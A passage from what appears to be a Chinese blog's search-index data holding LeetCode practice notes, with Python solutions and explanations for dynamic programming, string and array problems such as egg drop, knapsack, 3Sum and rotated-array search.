dp[i][j] = min(dp[i][j], not_broken) return dp[n][k-1]更改 DP 数组定义：DP[i][j] 表示在鸡蛋数量为 i， 操作数限制为 j 时能确定的最大楼层数此时在确定状态转移方程式就不需要再遍历寻找最优操作了。满足题目的时间要求。class Solution: def superEggDrop(self, k: int, n: int) -&amp;gt; int: dp = [[0]*(n+1) for i in range(k+1)] # i: 鸡蛋总数，j: 允许测试次数 # dp[i][j]: 能够测得的最大楼层数 for i in range(k+1): dp[i][0] = 0 for m in range(n+1): dp[0][m] = 0 m = 0 while dp[k][m] &amp;lt; n: m += 1 for i in range(1, k+1): dp[i][m] = dp[i][m-1] + dp[i-1][m-1] + 1 return m参考链接：经典动态规划：高楼扔鸡蛋经典动态规划：高楼扔鸡蛋（进阶）1143. Longest Common Subsequence比较传统的解法，在逐个元素比对的时候，要考虑清楚状态的转移过程。class Solution: def longestCommonSubsequence(self, text1: str, text2: str) -&amp;gt; int: n1, n2 = len(text1), len(text2) # 初始化 DP 数组，确定初始状态 dp = [[0]*n2 for i in range(n1)] for i in range(n1): if text1[i] == text2[0]: dp[i][0] = 1 else: dp[i][0] = dp[i-1][0] for j in range(n2): if text2[j] == text1[0]: dp[0][j] = 1 else: dp[0][j] = dp[0][j-1] # dp[i][j]: text1[:i] 与 text2[:j] 的最长公共子序列 # 状态转移 for i in range(1, n1): for j in range(1, n2): if text1[i] == text2[j]: dp[i][j] = dp[i-1][j-1] + 1 else: dp[i][j] = max(dp[i][j-1], dp[i-1][j]) return dp[-1][-1]参考链接：最长公共子序列经典动态规划：最长公共子序列1035. 不相交的线和上一题的思路差不多，但是添加了一个优化方法，可以将两个数组中没有交集的数直接剔除。因为没有交集的数一定不会有连线，在数据量增大的情况下，这些数据的冗余非常影响速度。这道题可以用双指针 i 和 j 分别从两个数组起点开始遍历的思路来理解，指针只能前进不能后退，那么每次状态转移的自由度为 2，指针 i 前进，或者指针 j 前进。而当 nums1[i] == nums2[j] 的时候，连线其实是必须的，因为按照规则，无法回头，所以当下连线一定是最好的选择。那么就可以直接定义一个二维的 dp 数组来进行状态转移，这里的 dp 表格的定义为： dp[i][j] 为数组 nums[:i+1] 和数组 nums[:j+1] 的最大连线数。当 nums1[i] == nums2[j] 时，我们一定会连线，所以最大连线数等于 dp[i][j] = dp[i-1][j-1] + 1，也就是 nums[:i] 和 nums[:j] 之间的最大连线数加上新连的这根线。当 nums1[i] != nums2[j] 时，我们不连线，所以 dp[i][j] 取决于上一个状态，i 退一步或者 j 退一步的最大连接数，即 dp[i][j] = max(dp[i][j-1], dp[i-1][j])。代码参考如下：class Solution: def maxUncrossedLines(self, nums1: List[int], nums2: List[int]) -&amp;gt; int: # 优化1：取交集，不是交集的不可能有连线，如果冗余过多导致速度很慢 nums = set(nums1) &amp;amp; set(nums2) nums1, nums2 = [i for i in nums1 if i in nums], [j for j in nums2 if j in nums] if not nums1 or not nums2: return 0 # 获取数列基本长度信息 n_row, n_col = len(nums1), len(nums2) # 初始化dp矩阵 dp = [[0] * n_col for _ in range(n_row)] if nums1[0] == nums2[0]: dp[0][0] = 1 # 状态转移 for i in range(1, n_row): if nums1[i] != nums2[0]: dp[i][0] = dp[i-1][0] else: dp[i][0] = 1 for j in range(1, n_col): if nums1[0] != nums2[j]: dp[0][j] = dp[0][j-1] else: dp[0][j] = 1 for i in range(1, n_row): for j in range(1, n_col): if nums1[i] == nums2[j]: dp[i][j] = dp[i-1][j-1] + 1 else: dp[i][j] = max(dp[i-1][j], dp[i][j-1]) return dp[-1][-1]583. Delete Operation for Two Strings思路同上class Solution: def minDistance(self, word1: str, word2: str) -&amp;gt; int: # 初始化 dp 数组 n1, n2 = len(word1), len(word2) dp = [[0]*(n2+1) for i in range(n1+1)] for i in range(1, n1+1): dp[i][0] = dp[i-1][0] + 1 for j in range(1, n2+1): dp[0][j] = dp[0][j-1] + 1 # dp[i][j]: word1[:i] 与 word2[:j] 的最小操作数 # 状态转移 for i in range(1, n1+1): for j in range(1, n2+1): if word1[i-1] == word2[j-1]: dp[i][j] = dp[i-1][j-1] else: dp[i][j] = min(dp[i-1][j], dp[i][j-1]) + 1 return dp[-1][-1]712. Minimum ASCII Delete Sum for Two Strings思路同上class Solution: def minimumDeleteSum(self, s1: str, s2: str) -&amp;gt; int: # 初始化dp数组 n1, n2 = len(s1), len(s2) dp = [[0]*(n2+1) for i in range(n1+1)] for i in range(1, n1+1): dp[i][0] = dp[i-1][0] + ord(s1[i-1]) for j in range(1, n2+1): dp[0][j] = dp[0][j-1] + ord(s2[j-1]) # dp[i][j]: s1[:i] 和 s2[:j] 的最小删除和 # 状态转移 for i in range(1, n1+1): for j in range(1, n2+1): if s1[i-1] == s2[j-1]: dp[i][j] = dp[i-1][j-1] else: dp[i][j] = min(dp[i][j-1] + ord(s2[j-1]), dp[i-1][j] + ord(s1[i-1])) return dp[-1][-1]516. Longest Palindromic Subsequence使用二维 DP 来定义子问题：DP[i][j] 表示 s[i..j] 的最长回文子序列长度。主要不同点就在于这是一个斜向初始化和遍历的 DP 数组。class Solution: def longestPalindromeSubseq(self, s: str) -&amp;gt; int: # 初始化DP数组 n = len(s) dp = [[0]*n for i in range(n)] for i in range(n): dp[i][i] = 1 # DP[i][j]: s[i..j] 的最长回文子序列长度 # 状态转移（斜向遍历） for l in range(1, n): for i in range(n-l): j = l + i if s[i] == s[j]: dp[i][j] = dp[i+1][j-1] + 2 else: dp[i][j] = max(dp[i][j-1], dp[i+1][j]) return dp[0][n-1]斜向遍历的坏处就是无法把二维 DP 数组压缩到一维，所以我们从下往上（i 逆序），从左往右（j 正序）的顺序遍历。通过借助 pre, temp 等中间变量，将二维的 DP 数组压缩到一维。可以节省更多的空间复杂度。class Solution: def longestPalindromeSubseq(self, s: str) -&amp;gt; int: # 初始化DP数组，把状态压缩到一维 n = len(s) dp = [1]*n # DP[j]: s[i..j] 的最长回文子序列长度 # 状态转移（按行逆序遍历） for i in range(n-2, -1, -1): pre = 0 for j in range(i+1,n): temp = dp[j] if s[i] == s[j]: dp[j] = pre + 2 else: dp[j] = max(dp[j-1], dp[j]) pre = temp return dp[n-1]931. Minimum Falling Path Sum推荐 DP 数组解法。class Solution: def minFallingPathSum(self, matrix: List[List[int]]) -&amp;gt; int: # 初始化DP数组 n = len(matrix) dp = [[0]*n for i in range(n)] for j in range(n): dp[0][j] = matrix[0][j] # dp[i][j] 落到 matrix[i][j] 位置时的最小路径和 # 状态转移 for i in range(1, n): for j in range(n): if j == 0: min_pre = min(dp[i-1][j], dp[i-1][j+1]) elif j == n-1: min_pre = min(dp[i-1][j-1], dp[i-1][j]) else: min_pre = min(dp[i-1][j-1], dp[i-1][j], dp[i-1][j+1]) dp[i][j] = min_pre + matrix[i][j] return min(dp[-1])递归 + 备忘录版本，要比 DP 数组慢很多。class Solution: def minFallingPathSum(self, matrix: List[List[int]]) -&amp;gt; int: n = len(matrix) memo = [[10001]*n for i in range(n)] def dp(i, j): if j &amp;lt; 0 or j &amp;gt;= n: return 10002 if i == 0: return matrix[0][j] if memo[i][j] != 10001: return memo[i][j] memo[i][j] = min(dp(i-1, j-1), dp(i-1, j), dp(i-1, j+1)) + matrix[i][j] return memo[i][j] res = 10001 for j in range(n): res = min(res, dp(n-1,j)) return res416. Partition Equal Subset Sum按照 0-1 背包问题，定义 DP 数组：dp[i][j] 当背包容量剩余 j 时，前 i 个物品能否刚好装满背包。数组元素为 True 或 Falseclass Solution: def canPartition(self, nums: List[int]) -&amp;gt; bool: total = sum(nums) if total % 2 != 0: return False target = int(total / 2) n = len(nums) # 初始化DP数组 dp = [[False] * (target+1) for i in range(n)] for i in range(n): dp[i][0] = True for j in range(1, target+1): if nums[0] == j: dp[0][j] = True # dp[i][j] 当背包容量剩余 j 时，前 i 个物品能否刚好装满背包 # 状态转移 for i in range(1, n): for j in range(1, target+1): if nums[i] &amp;gt; j: dp[i][j] = dp[i-1][j] else: dp[i][j] = dp[i-1][j-nums[i]] or dp[i-1][j] return dp[-1][-1]根据数组的特性，可以进行状态压缩。只是需要注意遍历顺序，j 需要逆序遍历，否则上一个 i-1 的状态会被覆盖掉class Solution: def canPartition(self, nums: List[int]) -&amp;gt; bool: total = sum(nums) if total % 2 != 0: return False target = int(total / 2) n = len(nums) # 初始化DP数组 dp = [False] * (target+1) dp[0] = True for j in range(1, target+1): if nums[0] == j: dp[j] = True # dp[i][j] 当背包容量剩余 j 时，前 i 个物品能否刚好装满背包 # 状态转移（i 正序，j 逆序遍历） for i in range(1, n): for j in range(target, 0, -1): if nums[i] &amp;lt;= j: dp[j] = dp[j-nums[i]] or dp[j] return dp[-1]494. Target Sum参考链接：动态规划和回溯算法到底谁是谁爹？一、回溯算法回溯算法的思路比较直观了当，直接按思考顺序进行穷举，配合备忘录来减少子问题的重复计算。但是代价就是相对比较高的时间和空间复杂度。class Solution: def findTargetSumWays(self, nums: List[int], target: int) -&amp;gt; int: n = len(nums) memo = dict() # 备忘录 # backtrack(i, rest) 的意义为从第 i 个数起，能凑出和为 Target - rest 的组合数 def backtrack(i, rest): if (i, rest) in memo: return memo[(i, rest)] # 结束条件：当凑出 Target 时，返回 1；否则返回 0 if i == n: if rest == 0: memo[(i, rest)] = 1 return memo[(i, rest)] else: memo[(i, rest)] = 0 return memo[(i, rest)] # 可选操作 # backtrack(i + 1, rest - nums[i]): 加上 Nums[i] 之后剩余可能的组合数 # backtrack(i + 1, rest + nums[i]): 减去 Nums[i] 之后剩余可能的组合数 memo[(i, rest)] = backtrack(i + 1, rest - nums[i]) + backtrack(i + 1, rest + nums[i]) return memo[(i, rest)] return backtrack(0, target)二、动态规划这个问题可以转化为416.分割等和子集问题，即本文上一题，也是背包问题中的一种。根据题目中元素前的符号我们可以将元素分成两个集合，假设 N 为总集合，A 为“加”集合，B 为“减”集合，T 为目标和，那么则有$ Sum(A) - Sum(B) = T $进而可以推出（省略一点中间步骤）$ Sum(A) = (T + Sum(N))/2 $至此，问题被转化为：从集合 N 中选出元素组合成集合 A 满足 A 的元素和为 $(T + Sum(N))/2$，请问一共有多少种选法？使用 DP 数组法，和子集分割问题不同的地方在于，这里的状态转移情况稍微不同，需要将“A包括i”和“A不包括i”两种情况的可能情况相加。class Solution: def findTargetSumWays(self, nums: List[int], target: int) -&amp;gt; int: # 判断特殊情况 s = sum(nums) if s &amp;lt; abs(target) or (s + target) % 2 == 1: return 0 # DP方法 # 初始化DP数组 n = len(nums) dp_target = (s + target) // 2 # 转换成子集分割问题时对应的目标和 dp = [[0] * (dp_target + 1) for i in range(n)] # dp[i][j]: 前 i 个元素能构成满足和为 j 的子集合数 # 初始状态 dp[0][0] += 1 if nums[0] &amp;lt;= dp_target: dp[0][nums[0]] += 1 # 状态转移 for i in range(1, n): for j in range(dp_target, -1, -1): if nums[i] &amp;gt; j: dp[i][j] = dp[i-1][j] else: dp[i][j] = dp[i-1][j] + dp[i-1][j - nums[i]] return dp[-1][-1]同样，状态可以进一步压缩以降低空间复杂度，但是一样要注意 j 要逆序遍历。class Solution: def findTargetSumWays(self, nums: List[int], target: int) -&amp;gt; int: s = sum(nums) if s &amp;lt; abs(target) or (s + target) % 2 == 1: return 0 # 初始化DP数组 n = len(nums) dp_target = (s + target) // 2 # 转换成子集分割问题时对应的子集和 dp = [0] * (dp_target + 1) dp[0] += 1 if nums[0] &amp;lt;= dp_target: dp[nums[0]] += 1 # 状态转移 for i in range(1, n): for j in range(dp_target, -1, -1): if nums[i] &amp;lt;= j: dp[j] = dp[j] + dp[j - nums[i]] return dp[-1]354. Russian Doll Envelopes参考链接：二维递增子序列：信封嵌套问题面对这道题，要做的第一件事就是排序。因为套娃过程是一个本质上信封高度或者宽度递增的过程，但是显然题目中给出的信封宽高是没有规律的。所以如果不对信封首先进行一定程度的排序预处理，那么在对信封的遍历过程中一定会遇到对目前已有的套娃方案进行中途插入的问题。因此以后面对类似的题目，也要首先注意题目是否需要排序这一操作。而这一题的难点也就在于如何对二元数组的序列进行排序。解法如下：将信封首先按宽度升序排序，宽度相同的时候按照高度降序排序。然后把信封所有的高度作为一个数组，然后在这个数组上计算最长递增子序列就可以得到本题答案。实际上就是通过排序将问题转化成了最长递增子序列的问题，该问题的解法可以参考本文的300. Longest Increasing Subsequence (LIS)。代码如下：class Solution: def maxEnvelopes(self, envelopes: List[List[int]]) -&amp;gt; int: # 按照 width 进行升序排列，如果 width 相等，则按照 height 降序排列 envs_sorted = sorted(envelopes, key=lambda env: (env[0], -env[1])) h_list = [env[1] for env in envs_sorted] # 按照最长递增子序列问题进行处理：二分的扑克牌方法 deck = [h_list[0]] for poker in h_list[1:]: if poker &amp;gt; deck[-1]: deck.append(poker) else: i, j = 0, len(deck) - 1 while i &amp;lt; j: mid = (i + j)//2 if poker &amp;gt; deck[mid]: i = mid + 1 else: j = mid deck[i] = poker return len(deck)53. Maximum Subarray参考链接：动态规划设计：最大子数组509.322.518. Coin Change 2参考链接：经典动态规划：完全背包问题这道题可以看作是一个背包问题的变体：有一个背包，最大容量为 amount，有一系列物品 coins，每个物品的重量为 coins[i]，每个物品的数量无限。请问有多少种方法，能够把背包恰好装满？在这里，关键的问题是每个物品数量是无限的。思路：也是使用动态规划，注意明确「状态」和「选择」状态：「背包容量」和「可选择的物品」选择：「装进背包」和「不装进背包」DP 数组的定义：若只使用 coins 中的前 i 个硬币的面值，若想凑出金额 j，有 dp[i][j] 种凑法。状态转移方程：dp[i][j] = dp[i - 1][j] + dp[i][j - coins[i-1]]在确定状态转移方程的过程中，我们需要保证子问题得到的最大组合数不会重复。dp[i - 1][j] 意味着我们的选择不把该硬币凑进我们的组合里，同时之后只限制在前i-1个面值的硬币里作选择。另一种情况dp[i][j - coins[i-1]]意味着我们在该轮选择接受该硬币，并且继续保留选择第i个面值的硬币的权利。这样两种情况下第i个面值的硬币的数量就是不同的，进而可以将他们对应的最大组合数相加得到当前状态下的最大组合数。class Solution: def change(self, amount: int, coins: List[int]) -&amp;gt; int: # 特殊输入处理 if amount == 0: return 1 if coins[0] &amp;gt; amount: return 0 # 初始化dp数组 n_coins = len(coins) dp = [[0]*(amount + 1) for i in range(n_coins)] # dp[i][j] 当背包容量为 i 时，面对是否要往里装一个 j 硬币时的最多组合数 # 初始状态 for i in range(n_coins): dp[i][0] = 1 for j in range(1, amount+1): if coins[0] &amp;gt; j: dp[0][j] = 0 else: dp[0][j] = dp[0][j-coins[0]] # 状态转移 for i in range(1, n_coins): for j in range(1, amount+1): if coins[i] &amp;gt; j: dp[i][j] = dp[i-1][j] else: dp[i][j] = dp[i-1][j] + dp[i][j-coins[i]] return dp[-1][-1]174. Dungeon Game参考链接：动态规划帮我通关了《魔塔》知道这道题要用动态规划解，但是起初无论怎么定义 DP 数组，都没办法实现合理的状态转移。因为我一开始都把 DP 数组定义成类似于：从左上角（dungeon[0][0]）走到dungeon[i][j]至少需要dp[i][j]的生命值从左上角（dungeon[0][0]）走到dungeon[i][j]能保留的最大生命值为dp[i][j]等等……希望能通过这些定义最终推出结果，但是很显然，这道题跟那些求「最大路径和」之类的题目不一样，因为在这样的DP数组定义下，这道题目的局部最优并不等于全局最优。当我们考虑状态dp[i][j]，不论我们基于何种原则（上一个状态剩下的血量，或者上一个路线的历史最低生命值）去选择上一个状态（dp[i-1][j]或者dp[i][j-1]），我们都不能保证在接下来的路线中不会遇到非常强大的怪物（绝对值非常大的负数），从而导致初始生命值需要非常大的值。因此，我们无论如何不能从已有路线中得到足够的信息从而进行状态转移，我们会发现信息藏在未来的路径里，而究其原因，根本上是因为增减机制的不对称性：即勇者先碰到怪物和先吃血瓶对于结果的影响是不同的。信息藏在未来的路径里，所以我们需要反向定义我们的 DP 数组，把终点公主（dungeon[-1][-1]）作为初始状态，反推到起点（dungeon[0][0]）：从dungeon[i][j]走到右下角(dungeon[-1][-1])至少需要dp[i][j]的生命值至此，DP 数组定义完毕，从终点开始反向遍历，便会发现自然而然就推出了状态转移方程。以后做动态规划之前不妨先想一想，这题需要正着来还是反着来？，我正着推能掌握足够的信息进行状态转移吗？代码如下：class Solution: def calculateMinimumHP(self, dungeon: List[List[int]]) -&amp;gt; int: # 初始化dp数组 height, width = len(dungeon), len(dungeon[0]) dp = [[0] * width for i in range(height)] # 初始状态 dp[-1][-1] = max(1, 1 - dungeon[-1][-1]) for i in range(height-2, -1, -1): dp[i][-1] = max(1, dp[i+1][-1] - dungeon[i][-1]) for j in range(width-2, -1, -1): dp[-1][j] = max(1, dp[-1][j+1] - dungeon[-1][j]) # dp[i][j][1]：从(1,j)开始走到右下角至少需要多少生命值 # 状态转移 for i in range(height-2, -1, -1): for j in range(width-2, -1, -1): dp[i][j] = max(1, min(dp[i+1][j], dp[i][j+1]) - dungeon[i][j]) return max(1, dp[0][0])514. Freedom TrailDP 递归函数参考链接：动态规划帮我通关了《辐射4》按照参考的思路，通过构建递归 DP 函数来解决该问题。首先明确「状态」和「选择」：状态：「当前ring上指针指向的位置」即ring[i]，「当前需要输入的字符」即key[j]选择：「如何拨动指针得到待输入的字符」通过分析，可以知道，当目标字符key[j]在ring中是唯一的时候，我们只有一个选择，即从顺时针或者逆时针中选择路径最短的那一个方向转过去。而当目标字符存在不止一个的时候，子问题就会发生分裂：我们需要通过穷举来比较选择哪一个位置作为下一个目标字符时得到的最终操作数最小。因此我们可以更加细化「选择」：选择：「转到圆盘上重复的目标字符中的哪一个」于是状态转移方程就比较好写了，伪代码如下:# 当前状态 ring[i], 目标字符key[j]def dp(i,j): if j &amp;gt;= len(key): return 0 # 基础状态 res = ... for k in range(len(ring)): res = min(res, min(abs(k-i), len(ring)-abs(k-i)) + dp(k, j+1)) return res其中min(abs(k-i), len(ring)-abs(k-i))是从i到k的最少旋转次数，dp(k, j+1))是以ring[k]为初始状态，key[j+1]为目标字符的最小旋转次数。更快，更高，更强然而我们可以发现，即便结合备忘录，上述方法的时间复杂度也非常高。而压缩问题的关键往往在于深刻理解这一问题状态转移的本质。在 LeetCode 的讨论里发现了一个很厉害的方案：基本逻辑和上述方案一样，也是使用 DP 函数递归，「状态」相同，但是在「选择」方面做出了很大的改进。选择：选择「顺时针最近的」或者「逆时针最近的」目标字符作为该轮的选择事实也是如此，对于状态(i,j)来说，最佳的key[j]一定只能是ring[i]的左边第一个或是右边第一个key[j]，只能是这两者之一。而对于一个圆盘来说，我们可以用字典来把圆盘上每一个位置向左或者向右碰到的第一个其他字符的位置存下来，这样就不需要遍历来寻找这些目标字符。直接将递归算法内的复杂度从len(ring)降到了常数级别，整整降低了一个数量级。总结，备忘录法提供的只是剪枝，整体复杂度的数量级很难下来。而根据问题本身性质对状态的「选择」进行数量级级别的减少复杂度，能对算法起更关键的优化效果。代码如下：# 递归法class Solution: def findRotateSteps(self, ring: str, key: str) -&amp;gt; int: len_ring = len(ring) # 把每一个字符按照顺时针和逆时针顺序碰到的第一个其他字符的索引记下来 # ring[i] 左边第一个字符 c 的索引为 lefts[i][c] lefts = [None for _ in range(len_ring)] cur = dict() for i in range(-len_ring + 1, len_ring, 1): cur[ring[i]] = i if i &amp;gt;= 0: lefts[i] = cur.copy() # ring[i] 右边第一个字符 c 的索引为 rights[i][c] rights = [None for _ in range(len_ring)] cur = dict() for i in range(2*len_ring-1, -1, -1): cur[ring[i%len_ring]] = i if i &amp;lt;= len_ring-1: rights[i] = cur.copy() # 当前状态ring[idx_ring], 下一个目标key[idx_key], 最少需要的旋转次数为 dp(idx_ring, idx_key) @functools.cache def dp(idx_ring, idx_key): if idx_key &amp;gt;= len(key): return 0 left_target = lefts[idx_ring][key[idx_key]] right_target = rights[idx_ring][key[idx_key]] return min( abs(idx_ring - left_target) + dp(left_target%len_ring, idx_key+1), abs(idx_ring - right_target) + dp(right_target%len_ring, idx_key+1) ) # 最终结果加上拍按钮的次数 return dp(0,0) + len(key)" }, { "title": "LeetCode 刷题记录 - String", "url": "/posts/LeetCode_string/", "categories": "Blogging, LeetCode", "tags": "LeetCode, String", "date": "2021-10-18 09:40:00 +0800", "snippet": " 22. Generate Parentheses记录一个很牛逼的 Solutionclass Solution: def generateParenthesis(self, n: int) -&amp;gt; List[str]: stack = [] res = [] def backtrack(open_count, close_count): if open_count == close_count == n: res.append(&quot;&quot;.join(stack)) return if open_count &amp;lt; n: stack.append(&quot;(&quot;) backtrack(open_count + 1, close_count) stack.pop() if close_count &amp;lt; open_count: stack.append(&quot;)&quot;) backtrack(open_count, close_count + 1) stack.pop() backtrack(0,0) return res1044. Longest Duplicate Substring二分法加滚动哈希394. 字符串解码碰到这种字符串类的题目，首先用脑子遍历一遍，如果过程中没有分叉，每遍历到一个字符得到的过渡答案是唯一的，那么就可以直接通过遍历分类讨论的方式解决。如果碰到括号这种有优先级的符号，就结合 Stack 来解决。这道题就是这样，首先遍历，发现直接过一遍就能推算出结果。当遇到左括号的时候需要优先计算括号内的内容，那么就将括号前的字符串中间结果和数字存储起来，等遍历到右括号的时候弹出再计算就可以了。代码如下：class Solution: def decodeString(self, s: str) -&amp;gt; str: stack = [] num = 0 res = &quot;&quot; # 遍历字符串 for c in s: if c.isdigit(): num = num*10 + int(c) elif c == &quot;[&quot;: stack.append((res, num)) res = &quot;&quot; num = 0 elif c == &quot;]&quot;: top = stack.pop() res = top[0] + res * top[1] else: res += c return res" }, { "title": "LeetCode 刷题记录 - Array", "url": "/posts/LeetCode_array/", "categories": "Blogging, LeetCode", "tags": "LeetCode, array", "date": "2021-10-18 09:40:00 +0800", "snippet": " 15. 3Sum首先将数列排序，然后分为负数和非负数两个 list，同时记录下 0 出现的数量进行分类讨论。对情况进行分类讨论，可以发现 result 里的 3 个数只有可能是 1 个负数加两个非负数或者 2 个负数加 1 个非负数的情况。由于 list 是有序的，因此对一个 list 遍历，另一个 list 使用双指针即可。总体时间复杂度为 $O(N^2)$。class Solution: def threeSum(self, nums: List[int]) -&amp;gt; List[List[int]]: if len(nums) &amp;lt;= 2: return [] nums.sort() nums_neg = [] nums_pos = [] count_0 = 0 # 区分正负 for i, num in enumerate(nums): if num &amp;gt; 0: nums_pos.append(num) elif num == 0: count_0 += 1 else: nums_neg.append(num) nums_neg.sort(reverse=True) if count_0 &amp;gt;= 1: nums_pos = [0] + nums_pos if count_0 &amp;gt;= 3: res.append([0,0,0]) # 开始遍历 res = [] # 1 负 + 2 非负 if len(nums_pos) &amp;gt;= 2: for k,num_n in enumerate(nums_neg): i = 0 j = len(nums_pos) - 1 if k &amp;gt; 0 and num_n == nums_neg[k - 1]: continue rest = - num_n while i &amp;lt; j: if nums_pos[i] + nums_pos[j] == rest: res.append([num_n, nums_pos[i], nums_pos[j]]) i += 1 while i &amp;lt; j and nums_pos[i] == nums_pos[i - 1]: i += 1 elif nums_pos[i] + nums_pos[j] &amp;lt; rest: i += 1 else: j -= 1 # 2 负 + 1 非负 if len(nums_neg) &amp;gt;= 2: for k,num_p in enumerate(nums_pos): i = 0 j = len(nums_neg) - 1 if k &amp;gt; 0 and num_p == nums_pos[k - 1]: continue rest = - num_p while i &amp;lt; j: if nums_neg[i] + nums_neg[j] == rest: res.append([num_p, nums_neg[i], nums_neg[j]]) i += 1 while i &amp;lt; j and nums_neg[i] == nums_neg[i - 1]: i += 1 elif nums_neg[i] + nums_neg[j] &amp;lt; rest: j -= 1 else: i += 1 return res当然此处代码还并非最优，可以继续改进。18. 4Sum思路同上一题，将输入的数列排序然后分正负（ 0 包含在正数数列）。对情况进行分类讨论，可以分为 0 + 4 （全正或者全负）, 1 + 3, 2 + 2 三种情况。每个情况都可以将问题化简为额外遍历加 TwoSum 或者 ThreeSum 的情况解决。这里 ThreeSum 的实现用了更简单的方案，但依旧是双指针。总体复杂度 $O(N^3)$。def twoSum(nums: List[int], target: int, add_list: List[int]) -&amp;gt; List[List[int]]: nums.sort() res = [] if len(nums) &amp;lt;= 1: return [] l = 0 r = len(nums) - 1 while l &amp;lt; r: current = nums[l] + nums[r] if current == target: res.append([nums[l], nums[r]] + add_list) l += 1 while l &amp;lt; r: if l &amp;gt; 0 and nums[l] == nums[l-1]: l += 1 else: break elif current &amp;lt; target: l += 1 else: r -= 1 return resdef threeSum(nums: List[int], target: int, add_list: List[int]) -&amp;gt; List[List[int]]: nums.sort() res = [] if len(nums) &amp;lt;= 2: return [] for i, num in enumerate(nums): if i &amp;gt; 0 and num == nums[i - 1]: continue l = i + 1 r = len(nums) - 1 while l &amp;lt; r: current = num + nums[l] + nums[r] if current == target: res.append([num, nums[l], nums[r]] + add_list) l += 1 while l &amp;lt; r: if l &amp;gt; 0 and nums[l] == nums[l-1]: l += 1 else: break elif current &amp;lt; target: l += 1 else: r -= 1 return resclass Solution: def fourSum(self, nums: List[int], target: int) -&amp;gt; List[List[int]]: nums.sort() nums_pos = [] nums_neg = [] for i, num in enumerate(nums): if num &amp;gt;= 0: nums_pos.append(num) else: nums_neg.append(num) res = [] # 0 + 4 if target &amp;gt;= 0: for i, num in enumerate(nums_pos): if i &amp;gt; 0 and num == nums_pos[i-1]: continue res = res + threeSum(nums_pos[i+1:], target - num, [num]) else: for i, num in enumerate(nums_neg): if i &amp;gt; 0 and num == nums_neg[i-1]: continue res = res + threeSum(nums_neg[i+1:], target - num, [num]) # 1 + 3 for i, num in enumerate(nums_pos): if i &amp;gt; 0 and num == nums_pos[i-1]: continue target_local = target - num if target_local &amp;lt; 0: res = res + threeSum(nums_neg, target_local, [num]) for i, num in enumerate(nums_neg): if i &amp;gt; 0 and num == nums_neg[i-1]: continue target_local = target - num if target_local &amp;gt;= 0: res = res + threeSum(nums_pos, target_local, [num]) # 2 + 2 for i, num in enumerate(nums_neg): if i &amp;gt; 0 and num == nums_neg[i - 1]: continue j = i + 1 while j &amp;lt; len(nums_neg): target_local = target - nums_neg[i] - nums_neg[j] if target_local &amp;gt;= 0: res = res + twoSum(nums_pos, target_local, [nums_neg[i], nums_neg[j]]) j += 1 while j &amp;lt; len(nums_neg): if nums_neg[j] == nums_neg[j-1]: j += 1 else: break return res31. Next Permutation这道题比较有意思，首先拿几个简单例子进行穷举，观察每一个数和下一个比它大的数之间的关系，就能得出结论。假设目标数为 $a_1$ 有 $n$ 位，其下一个数为 $a_2$，他们从第 $i$ 位开始不同（$i \\geq 0$）。那么则满足条件： $a_1[i + 1] &amp;gt; a_1[i]$ $\\forall \\ j \\in [i+1, \\ n-2] \\cap \\mathbb{N}, \\ a_1[j] \\geq a_1[j + 1] $ $a_2[i] = \\mathop{\\text{min}} \\{ a_1[j], \\ i&amp;lt;j\\leq n-1 \\ \\text{and} \\ a_1[j] &amp;gt; a_1[i] \\} $ $\\forall \\ j \\in [i+1, \\ n-2] \\cap \\mathbb{N}, \\ a_2[j] \\leq a_2[j + 1] $ 根据这四条关系就可以开始编写函数了： 按照倒序找到输入数组中最后一个比前一个数大的数，将其前一个数的位置记为 $i$ 找到从 $i+1$ 位开始比第 $i$ 位大的最小数（候选数相同则选最靠右的），将该数与第 $i$ 位数互换 将数组从 $i+1$ 位开始到最后的切片 reverse 结束def swap(nums: List[int], idx1: int, idx2: int): temp = nums[idx1] nums[idx1] = nums[idx2] nums[idx2] = tempclass Solution: def nextPermutation(self, nums: List[int]) -&amp;gt; None: &quot;&quot;&quot; Do not return anything, modify nums in-place instead. &quot;&quot;&quot; n = len(nums) # 确定进位节点 i = n - 1 while i &amp;gt; 0: if nums[i] &amp;gt; nums[i-1]: break else: i -= 1 # 判断是否是最大情况 if i == 0: nums.sort() return # 寻找比交换数 pre = nums[i-1] j = i idx_swap = i while j &amp;lt;= n - 1: if nums[j] &amp;gt; pre and nums[j] &amp;lt;= nums[idx_swap]: idx_swap = j j += 1 # 交换 swap(nums, i-1, idx_swap) # reverse 剩余数列 if i &amp;lt; n - 1: k = i l = n - 1 while k &amp;lt; l: swap(nums, k, l) k += 1 l -= 133. 搜索旋转排序数组整数数组 nums 按升序排列，数组中的值互不相同。在传递给函数之前，nums 在预先未知的某个下标 k （ 0 &amp;lt;= k &amp;lt; nums.length ）上进行了旋转，使数组变为 [nums[k], nums[k+1], ..., nums[n-1], nums[0], nums[1], ..., nums[k-1]] （下标 从 0 开始 计数）。例如， [0,1,2,4,5,6,7] 在下标3处经旋转后可能变为 [4,5,6,7,0,1,2] 。给你旋转后的数组 nums 和一个整数 target ，如果 nums 中存在这个目标值 target ，则返回它的下标，否则返回 -1 。思路提示说时间要求$O(logN)$，那肯定想到用二分法。首先的思路是先用一遍二分法找到旋转的下标 k ，然后复原数组之后再重新用一次二分法。但是经过仔细思考之后发现，其实只需要一次二分法也能定位 target，只是在每一次决定取哪半边的时候需要更加复杂的判断。因为旋转数组从下标 k 开始被分割成左右两个递增序列，且左边序列的最小值大于右边序列的最大值。因此在使用二分法时， 通过比较左右两指针值的大小，可以得出两指针是否在一个递增序列中，如果在一个序列中，就变成了常规的二分法；如果不是，则讨论中点落在哪一个递增序列里，然后结合 target 的位置决定取左边还是取右边。遇到的问题二分法最容易碰到的就是无限循环的问题。我们知道当 left 和 right 只差 1 时，算出来的 middle 就等于左指针的位置。而此时当你的代码在后续的左右指针变动中存在 left = middle 而不是 left = middle + 1 时，就存在无限循环的风险，所以需要仔细筛查。当更新语句中赋的值为 middle + 1 时，该语句所在的判断情况应当对应 if target &amp;gt; nums[middle] 或者 if target &amp;lt; nums[middle]，因为只有百分百确定 middle 位置的值不等于 target 时，我们才可以在更新时直接跳过 middle ,从 middle + 1 开始新的二分。参考代码class Solution: def search(self, nums: List[int], target: int) -&amp;gt; int: # 直接使用二分法， 只是判断的情况比较复杂 l, r = 0, len(nums) - 1 while l &amp;lt; r: # 计算中点 mid = (l + r) // 2 # 首先对根据左右指针的值进行情况分类 if nums[l] &amp;lt; nums[r]: # l 和 r 都在一个递增序列里 # 常规二分法解决 if target &amp;gt; nums[mid]: l = mid + 1 else: r = mid 